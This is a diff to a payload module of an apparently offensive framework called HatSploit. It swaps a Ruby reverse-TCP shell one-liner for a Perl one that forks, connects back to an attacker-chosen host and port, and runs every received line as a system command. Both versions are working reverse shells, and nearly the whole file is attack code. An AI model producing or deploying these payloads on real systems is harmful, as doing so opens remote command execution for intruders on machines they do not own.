@@ -24,27 +24,27 @@
 # SOFTWARE.
 #
 
-from core.lib.payload import HatSploitPayload
+from core.lib.payload import Payload
+from utils.tcp.tcp import TCPClient
 
-from utils.tcp.tcp import tcp
 
-class HatSploitPayload(HatSploitPayload):
-    tcp = tcp()
-
+class HatSploitPayload(Payload, TCPClient):
     details = {
-        'Name': "Ruby Shell Reverse TCP",
-        'Payload': "multi/generic/ruby_reverse_tcp",
+        'Category': "single",
+        'Name': "Perl Shell Reverse TCP",
+        'Payload': "unix/generic/perl_reverse_tcp",
         'Authors': [
             'enty8080'
         ],
-        'Description': "Ruby shell reverse TCP payload.",
+        'Description': "Perl shell reverse TCP payload.",
         'Dependencies': [
             ''
         ],
         'Comments': [
             ''
         ],
-        "Platform": "multi",
+        'Architecture': "generic",
+        'Platform': "unix",
         'Risk': "high",
         'Type': "reverse_tcp"
     }
@@ -52,7 +52,7 @@ class HatSploitPayload(HatSploitPayload):
     options = {
         'LHOST': {
             'Description': "Local host.",
-            'Value': tcp.get_local_host(),
+            'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
@@ -65,10 +65,13 @@ class HatSploitPayload(HatSploitPayload):
     }
 
     def run(self):
-        local_host, local_port = self.parser.parse_options(self.options)
+        local_host, local_port = self.parse_options(self.options)
+        local_data = local_host + ':' + local_port
 
-        self.badges.output_process("Generating payload...")
-        payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""+local_host+"\",\""+local_port+"\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+        self.output_process("Generating payload...")
+
+        payload = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"LOCAL_DATA\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
+        payload = payload.replace("LOCAL_DATA", local_data)
 
         self.payload = payload
         self.instructions = payload
